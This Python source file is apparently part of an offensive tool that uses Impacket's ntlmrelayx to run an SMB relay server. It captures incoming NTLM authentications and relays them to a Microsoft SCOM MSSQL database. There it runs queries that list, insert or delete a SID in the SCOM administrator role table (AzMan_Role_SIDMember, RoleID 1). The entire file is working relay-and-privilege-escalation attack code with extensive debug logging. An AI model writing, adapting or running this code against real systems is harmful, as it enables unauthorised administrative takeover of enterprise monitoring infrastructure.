import time
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.mssqlattack import MSSQLAttack
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ldap import ldaptypes

from lib.logger import logger


class SCOMMSSQLAttackClient(ProtocolAttack):
    PLUGIN_NAMES = ["MSSQL"]
    
    def run(self):
        logger.info("=" * 80)
        logger.info("[DEBUG] SCOMMSSQLAttackClient.run() called!")
        logger.info(f"[DEBUG] Attack client type: {type(self)}")
        logger.info(f"[DEBUG] Has client attribute: {hasattr(self, 'client')}")
        if hasattr(self, 'client'):
            logger.info(f"[DEBUG] Client type: {type(self.client)}")
            logger.info(f"[DEBUG] Client attributes: {dir(self.client)}")
        logger.info(f"[DEBUG] Has username attribute: {hasattr(self, 'username')}")
        logger.info(f"[DEBUG] Has scom_relay attribute: {hasattr(self, 'scom_relay')}")
        logger.info("=" * 80)
        
        self.scom_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logger.info(f"[ERROR] Exception in run(): {e}")
            import traceback
            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")
        finally:
            self.scom_relay.attack_lock.release()

    def _run(self):
        logger.info("[DEBUG] Entering _run() method")
        
        # Get username from the client
        username = self.username if hasattr(self, 'username') else 'Unknown'
        logger.info(f"[DEBUG] Username: {username}")
        
        if username in self.scom_relay.attacked_targets:
            logger.debug(f"Skipping user {username} since attack was already performed")
            return

        try:
            logger.info(f"[+] Authenticated as: {username}")
            logger.info(f"[DEBUG] Operation mode: {self.scom_relay.operation_mode}")
            logger.info(f"[DEBUG] Query to execute: {self.scom_relay.query}")

            # Execute the appropriate query based on operation mode
            if self.scom_relay.operation_mode == 'list':
                logger.info("[*] Listing current members of SCOM admin role...")
                self.execute_query(self.scom_relay.query)
            elif self.scom_relay.operation_mode == 'delete':
                logger.info(f"[*] Removing SID from SCOM admin role...")
                self.execute_query(self.scom_relay.query)
                logger.info(f"[+] SID successfully removed from SCOM admin role")
            else:  # update/insert mode
                logger.info(f"[*] Adding SID to SCOM admin role...")
                self.execute_query(self.scom_relay.query)
                logger.info(f"[+] SID successfully added to SCOM admin role")

        except Exception as e:
            logger.info(f"[ERROR] An error occurred during the relay: {str(e)}")
            import traceback
            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")

        # Mark attack as complete
        self.finish_run()

    def execute_query(self, query):
        """Execute SQL query using the MSSQL client"""
        logger.info("[DEBUG] Entering execute_query()")
        logger.info(f"[DEBUG] Query: {query}")
        
        try:
            if not hasattr(self, 'client'):
                logger.info("[ERROR] self.client does not exist!")
                return
            
            logger.info(f"[DEBUG] Client object: {self.client}")
            logger.info(f"[DEBUG] Client has sql_query: {hasattr(self.client, 'sql_query')}")
            
            if not hasattr(self.client, 'sql_query'):
                logger.info("[ERROR] Client does not have sql_query method!")
                logger.info(f"[DEBUG] Available methods: {[m for m in dir(self.client) if not m.startswith('_')]}")
                return
            
            logger.info("[DEBUG] Calling client.sql_query()...")
            self.client.sql_query(query)
            logger.info("[DEBUG] sql_query() completed")
            
            # Print the results
            logger.info("[DEBUG] Calling printReplies()...")
            self.client.printReplies()
            logger.info("[DEBUG] Calling printRows()...")
            self.client.printRows()
            logger.info("[DEBUG] Query execution completed successfully")
            
        except Exception as e:
            logger.info(f"[ERROR] Error executing query: {str(e)}")
            import traceback
            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")

    def finish_run(self):
        """Mark the attack as complete"""
        logger.info("[DEBUG] Entering finish_run()")
        username = self.username if hasattr(self, 'username') else 'Unknown'
        if username != 'Unknown':
            self.scom_relay.attacked_targets.append(username)
            logger.info(f"[DEBUG] Added {username} to attacked_targets")
        logger.info("[DEBUG] Attack complete")


class MSSQLSCOMRELAY:
    def __init__(self, target: str, sid: str, interface: str, port: int, 
                 timeout: int, operation_mode: str, verbose: bool):
        self.target = target
        self.sid = sid
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.operation_mode = operation_mode
        self.verbose = verbose
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.query = None

        # Build the appropriate SQL query based on operation mode
        self.query = self.build_query()

        # Ensure target has proper format
        if not self.target.startswith("mssql://"):
            self.target = f"mssql://{self.target}"
        
        logger.info(f"Targeting MSSQL server at {self.target}")
        logger.info(f"Operation mode: {self.operation_mode}")

        # Set up the relay configuration
        target_processor = TargetsProcessor(singleTarget=self.target)

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        
        # Set the query for MSSQL - this is how ntlmrelayx does it with -q flag
        # config.queries must be a LIST of queries, not a dict!
        config.queries = [self.query]
        logger.info(f"[DEBUG] Set query in config.queries: {config.queries}")
        
        # Register Impacket's built-in MSSQL attack class
        config.setAttacks({"MSSQL": MSSQLAttack})
        logger.info("[DEBUG] Registered MSSQLAttack class")
        
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")
        config.setOutputFile(None)

        self.server = SMBRelayServer(config)
        logger.info("[DEBUG] SMBRelayServer created successfully")

    def convert_string_sid(self, sid):
        """Convert string SID to hex format for SQL query"""
        try:
            hexsid = ldaptypes.LDAP_SID()
            hexsid.fromCanonical(sid)
            querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
            logger.info(f'[*] Converted {sid} to {querysid}')
            return querysid
        except Exception as e:
            logger.info(f"Error converting SID: {str(e)}")
            return None

    def build_query(self):
        """Build the appropriate SQL query based on operation mode"""
        if self.operation_mode == 'list':
            query = "Use OperationsManager; SELECT * FROM AzMan_Role_SIDMember WHERE RoleID = 1;"
            logger.debug(f"Built list query: {query}")
            return query
        
        # For insert/delete, we need to convert the SID
        if not self.sid:
            logger.info("Error: SID is required for insert/delete operations")
            return None

        # Check if SID is already in hex format
        if self.sid.startswith("0x"):
            hex_sid = self.sid
            logger.info(f"[*] Using provided hex SID: {hex_sid}")
        else:
            hex_sid = self.convert_string_sid(self.sid)
            if not hex_sid:
                return None

        if self.operation_mode == 'delete':
            query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {hex_sid};"
        else:  # update/insert mode
            query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {hex_sid});"
        
        logger.debug(f"Built query: {query}")
        return query

    def start(self):
        """Start the relay server"""
        if not self.query:
            logger.info("Error: Failed to build SQL query. Exiting.")
            return

        logger.info(f"Listening on {self.interface}:{self.port}")
        logger.info("Waiting for incoming connections...")
        logger.info(f"Query ready: {self.query}")

        try:
            logger.info("[DEBUG] About to call self.server.start()...")
            self.server.start()
            logger.info("[DEBUG] self.server.start() completed")
        except Exception as e:
            logger.info(f"[ERROR] Exception starting server: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")
            return

        logger.info("[DEBUG] Entering main loop...")
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.info(f"[ERROR] Exception in main loop: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")

    def get_attack_mssql_client(self, *args, **kwargs):
        """Return the attack client for MSSQL"""
        logger.info("[DEBUG] get_attack_mssql_client() called!")
        logger.info(f"[DEBUG] args: {args}")
        logger.info(f"[DEBUG] kwargs: {kwargs}")
        attack_client = SCOMMSSQLAttackClient(*args, **kwargs)
        attack_client.scom_relay = self
        logger.info(f"[DEBUG] Created attack client: {attack_client}")
        logger.info(f"[DEBUG] Attack client has scom_relay: {hasattr(attack_client, 'scom_relay')}")
        return attack_client

    def shutdown(self):
        logger.info("Job done...")
        exit()